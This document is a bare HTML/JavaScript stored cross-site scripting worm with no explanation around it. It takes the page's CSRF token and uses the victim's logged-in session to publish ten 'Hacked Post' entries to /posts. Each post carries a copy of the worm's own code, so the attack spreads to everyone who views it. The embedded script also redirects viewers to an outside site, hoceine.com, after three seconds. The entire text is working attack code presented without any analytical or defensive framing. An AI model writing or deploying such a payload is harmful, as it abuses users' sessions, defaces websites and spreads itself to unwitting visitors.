<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
(function() {
    const createPost = async () => {
        const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
        
        const postData = {
            title: 'Hacked Post',
            content: `<script>
                // Create posts and redirect after 3 seconds
                setTimeout(() => {
                    window.location.href = 'https://hoceine.com';
                }, 3000);
                
                ${createPost.toString()}
            <\/script>`,
            excerpt: 'Hacked Excerpt', 
            is_published: true
        };

        try {
            // Create multiple posts
            for (let i = 0; i < 10; i++) {
                await axios({
                    method: 'post',
                    url: '/posts',
                    data: {
                        ...postData,
                        title: `Hacked Post ${i}`
                    },
                    headers: {
                        'X-CSRF-TOKEN': csrfToken,
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    withCredentials: true
                });
            }
        } catch (error) {
            console.error('Error creating post:', error.response?.data || error.message);
        }
    };

    createPost();
})();
</script>